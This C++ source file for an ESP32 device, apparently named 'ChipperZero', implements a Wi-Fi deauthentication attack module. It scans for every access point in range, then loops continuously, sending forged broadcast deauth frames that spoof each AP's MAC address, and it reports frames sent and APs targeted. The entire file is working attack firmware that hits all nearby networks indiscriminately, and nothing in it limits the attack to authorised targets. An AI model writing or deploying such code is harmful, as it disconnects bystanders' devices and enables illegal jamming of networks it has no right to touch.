#include "wifi_deauth.h"

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>

DeauthModule g_wifiDeauth;

namespace {

struct APEntry {
    uint8_t bssid[6];
    uint8_t channel;
};

static APEntry s_targets[32];
static uint8_t s_targetCount = 0;

static void sendDeauth(const uint8_t* apMac, uint8_t channel) {
    uint8_t frame[26] = {
        0xC0, 0x00,                                     // FC: Deauth
        0x3A, 0x01,                                     // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,             // DA: broadcast
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // SA: AP
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // BSSID: AP
        0x00, 0x00,                                     // SeqCtrl
        0x07, 0x00,                                     // Reason: Class 3 frame
    };
    memcpy(&frame[10], apMac, 6);
    memcpy(&frame[16], apMac, 6);

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    for (int j = 0; j < 5; j++) {
        esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
        delayMicroseconds(200);
    }
}

static uint8_t scanTargets() {
    WiFi.mode(WIFI_STA);
    int n = WiFi.scanNetworks(/*async=*/false, /*hidden=*/true);
    if (n <= 0) return 0;
    uint8_t cnt = (n > 32) ? 32 : (uint8_t)n;
    for (uint8_t i = 0; i < cnt; i++) {
        memcpy(s_targets[i].bssid, WiFi.BSSID(i), 6);
        s_targets[i].channel = (uint8_t)WiFi.channel(i);
    }
    WiFi.scanDelete();
    return cnt;
}

void deauthTask(void* arg) {
    DeauthModule* self = reinterpret_cast<DeauthModule*>(arg);

    // Scan first
    s_targetCount = scanTargets();
    self->setApCount(s_targetCount);

    if (s_targetCount == 0) {
        self->clearTask();
        vTaskDelete(nullptr);
        return;
    }

    // Switch to AP mode for raw TX
    WiFi.mode(WIFI_AP);
    WiFi.softAP("ChipperZero", nullptr, 1, 0, 1);

    uint8_t idx = 0;

    while (self->isRunning()) {
        sendDeauth(s_targets[idx].bssid, s_targets[idx].channel);
        self->incSent();
        idx = (idx + 1) % s_targetCount;
        vTaskDelay(10);
    }

    WiFi.mode(WIFI_OFF);
    self->clearTask();
    vTaskDelete(nullptr);
}

}  // namespace

void DeauthModule::start() {
    if (running_.exchange(true)) return;
    if (task_ != nullptr) { running_ = false; return; }
    sent_    = 0;
    apCount_ = 0;
    xTaskCreatePinnedToCore(deauthTask, "wifi_deauth", 4096, this, 1, &task_, 0);
}

void DeauthModule::stop() {
    if (!running_) return;
    running_ = false;
    for (int i = 0; i < 100 && task_; ++i) vTaskDelay(pdMS_TO_TICKS(10));
    task_ = nullptr;
}

void DeauthModule::fillStats(char* buf, size_t len) {
    uint8_t n = apCount_.load();
    if (n == 0) {
        snprintf(buf, len, "Scanning APs...\n");
    } else {
        snprintf(buf, len, "%lu frames sent\n%u APs targeted",
                 (unsigned long)sent_.load(), n);
    }
}
